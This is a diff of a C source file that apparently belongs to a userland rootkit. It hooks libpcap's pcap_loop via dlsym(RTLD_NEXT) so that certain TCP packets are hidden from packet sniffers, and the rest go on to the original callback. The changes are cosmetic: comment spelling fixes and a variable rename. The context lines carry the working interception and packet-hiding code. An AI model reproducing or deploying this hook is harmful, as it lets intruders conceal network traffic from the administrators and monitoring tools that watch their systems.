@@ -35,7 +35,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *pa
 	daddr.s_addr = p_iphdr->daddr;
 	dest = inet_ntoa(daddr);
 	
-    // if tcp
+    // if TCP
 	if(p_iphdr->protocol==6) {
 		struct tcphdr *p_tcphdr;
 		p_tcphdr = (struct tcphdr *)(packet + 14 + 20);
@@ -49,14 +49,14 @@ void got_packet(u_char *args, const struct pcap_pkthdr *pkthdr, const u_char *pa
             printf("src ip:%s  dest ip:%s\n",src, dest);
             return ;
         } else {
-            // If we dont want to hide the packet, call the original callback that was defiened by sniffer coder
+            // If we don't want to hide the packet, call the original callback that was defined by sniffer coder
             if (original_callback){
                 original_callback(args, pkthdr, packet);
                 printf("\nDebug: called original_callback\n");
             }
         }
     } else{
-        // If we dont want to hide the packet, call the original callback that was defiened by sniffer coder
+        // If we don't want to hide the packet, call the original callback that was defined by sniffer coder
         if (original_callback){
             original_callback(args, pkthdr, packet);
             printf("\nDebug: called original_callback\n");
@@ -69,9 +69,9 @@ int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user) {
     
     printf("Deubg: pcap_loop hooked.\n");
     original_callback = callback; // Save original callback func for later use
-    int (*new_pcap_loop)(pcap_t *p, int cnt, pcap_handler callback, u_char *user);  // Declare new function that has the same properties of pcap_loop
-    new_pcap_loop = dlsym(RTLD_NEXT, "pcap_loop"); // Find the next symbol that points to the original pcap_loop and set new_pcap_loop to point on this symbol
-    new_pcap_loop(p, cnt, got_packet, user); // Call the original pcap_loop but instead of use original callback function, use got_packet()
+    int (*original_pcap_loop)(pcap_t *p, int cnt, pcap_handler callback, u_char *user);  // Declare new function that has the same properties of pcap_loop
+    original_pcap_loop = dlsym(RTLD_NEXT, "pcap_loop"); // Find the next symbol that points to the original pcap_loop and set original_pcap_loop to point on this symbol
+    original_pcap_loop(p, cnt, got_packet, user); // Call the original pcap_loop but instead of use original callback function, use got_packet()
     return 0;
 }
 
